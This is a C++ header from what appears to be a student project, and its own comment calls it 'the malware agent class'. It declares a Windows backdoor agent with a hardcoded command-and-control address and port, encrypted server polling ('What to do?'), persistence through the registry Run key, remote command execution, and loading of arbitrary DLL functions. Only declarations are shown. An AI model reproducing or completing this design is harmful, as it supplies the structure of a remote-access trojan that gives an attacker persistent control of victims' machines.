/*
the malware agent class

_______________________________________________________
|		Written by MOSHE GOWERS and Alex Dreyfuss	   |
|		Cyber Elite Project 2017/18					   |
|													   |
|______________________________________________________|
*/													   
#pragma once
#ifndef AGENT_H
#define AGENT_H

#include "Socket.h"
#include "DiffieHelman.h"
#include "Base64.h"
#include "AES_crypto.h"
//#include "aes.h"
#include <Windows.h>
#include <winreg.h>
#include <vector>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <thread>
using namespace std;

#define WIN32_LEAN_AND_MEAN
#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4921"
#define SERVER_ADDRESS "192.168.43.137"
#define REQUEST_STRING "What to do?"
#define REQUEST_LENGTH 12
#define MILLISECONDS 24 * 60 * 60 * 1000


class Agent
{
private:
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	addrinfo *ptr;
	int recvbuflen;
	Socket mySocket;
	
	AES_crypto aes;
	

	void CreateNewSymetricKey();
	void CreateNewSymetricKeyWithThread();
	void GetRequestFromServer();
public:
	BOOL set_curr_proc_to_autostart();
	LPCWSTR AUTO_START_NAME = (LPCWSTR)TEXT("Persistence");
	LPCWSTR AUTO_START_PATH = (LPCWSTR)TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");


	Agent();
	string sharedKey;

	void CreateSocket();
	void SendMessageToServer(const char *message, size_t length, char *code, bool encrypt = false);
	void ReciveMessage();
	void Shutdown();
	void Cleanup();
	string runDynamicFunction(string library, string function, string cmd = "");
	string exec(string);
};

#endif
